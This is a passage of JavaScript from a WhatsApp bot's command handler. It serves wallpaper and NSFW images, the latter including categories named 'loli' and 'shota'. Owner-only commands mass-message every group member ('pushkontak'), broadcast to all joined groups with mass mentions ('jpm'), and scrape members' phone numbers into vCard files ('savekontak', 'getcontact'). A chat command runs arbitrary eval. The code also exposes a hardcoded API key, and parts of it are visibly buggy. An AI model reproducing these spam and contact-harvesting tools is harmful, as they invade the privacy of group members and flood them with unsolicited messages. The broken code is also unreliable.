var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./MikoMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'animewallpaper2': case 'animewall2': {
if (!args.join(" ")) return replygcxeon("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
anu = await wallpaper(args)
result = anu[Math.floor(Math.random() * anu.length)]
XeonBotInc.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break

case 'afk': {
if (!m.isGroup) return reply(mess.only.group)
if (!text) return replygcxeon(`Example ${prefix+command} want to sleep`)
const rafelgf = fs.readFileSync(`./media/thumb5.mp4`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
let syacption = (`${m.pushName} Telah MelMelakukan AFK\nAlasan : ${args.join(" ") ? args.join(" ") : ''}`)
XeonBotInc.sendMessage(m.chat, { caption: syacption, video: rafelgf, gifPlayback: true  }, { quoted: m })
}
break
case 'animewall': case 'animewallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replygcxeon('What wallpaper do you want?')
reply(mess.wait)
const wall = new AnimeWallpaper()
    const pages = [1,2,3,4]
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null)
const i = Math.floor(Math.random() * wallpaper.length)    
            await XeonBotInc.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
return('Error!')
})
//XeonBotInc.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
XeonBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case '>':
case '=>':
if (!XeonTheCreator) return XeonStickOwner()
var err = new TypeError
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return replygcxeon(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replygcxeon(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replygcxeon(util.format(_syntax + _err))
}
break
case 'pushkontak': {
    if (!XeonTheCreator) return XeonStickOwner()
      if (!m.isGroup) return replygcxeon(`The feature works only in grup`)
    if (!text) return replygcxeon(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcxeon(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    XeonBotInc.sendMessage(pler, { text: q})
     }  
     replygcxeon(`Done`)
      }
      break
case "pushkontakv2":{
if (!XeonTheCreator) return XeonStickOwner()
if (!q) return replygcxeon(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
reply(mess.wait)
const metadata2 = await XeonBotInc.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
XeonBotInc.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygcxeon(`Success`)
}
break

case "pushkontakv3":
if (!XeonTheCreator) return reply(`Khusus Owner Aja`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("Otw Boskuuu")
const groupMetadataa = !isGroup? await XeonBotInc.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await XeonBotInc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await XeonBotInc.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}
}
reply("Succes Boss!")
break
case "pushkontakv4":
if (!XeonTheCreator) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
await reply("Otw Boskuuu")
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await XeonBotInc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await XeonBotInc.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
}
}
reply("Succes Boss!")
break

case 'savekontak': case 'svkontak':
if (!XeonTheCreator) return reply(`Khusus Owner Ajah`)
if (!m.isGroup) return m.reply(`Fitur Ini Khusus Group`)
let cmiggc = await XeonBotInc.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
XeonBotInc.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break

case "cekidgc": {
if (!isPrem) return replyprem(mess.premium)
let getGroups = await XeonBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await XeonBotInc.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv3 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case "savekontakv2": {
if (!XeonTheCreator) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadataa = !isGroup? await XeonBotInc.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await XeonBotInc.sendMessage(from, { document: fs.readFileSync("./data/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./data/database/contacts.json", JSON.stringify(contacts))
}
}
break

case "jpm": case "jpm2":{
if (!XeonTheCreator) return reply(`Khusus Owner Aja`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await XeonBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await XeonBotInc.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await XeonBotInc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await XeonBotInc.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL TUAN ONWER✅*")
}
break

case 'sendkontak': case 'kontak':
if (!XeonTheCreator) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return m.reply(`Khusus Group`)
if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
XeonBotInc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break

case 'getcontact': case 'getkontak':
if (!XeonTheCreator) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return m.reply(`Fitur Ini Khusus Group`)
huhuhs = await XeonBotInc.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
XeonBotInc.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break

            case 'id':{
            replygcxeon(from)
           }
          break
          case 'userjid':{
          	if(!XeonTheCreator) return XeonStickOwner()
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replygcxeon(textt)
    }
    break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break
	case 'hentaivid2': {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
XeonBotInc.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
const { hentai } = require('./lib/scraper.js')
anu = await hentai()
result912 = anu[Math.floor(Math.random(), anu.length)]
XeonBotInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!isPrem) return replyprem(mess.premium)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break 
case 'animespank':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await XeonBotInc.sendMessage(m.chat, { caption:  `Ini dia!!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
return('Error!')
})
break
case 'ahegao':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ass':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'bdsm':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'blowjob':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
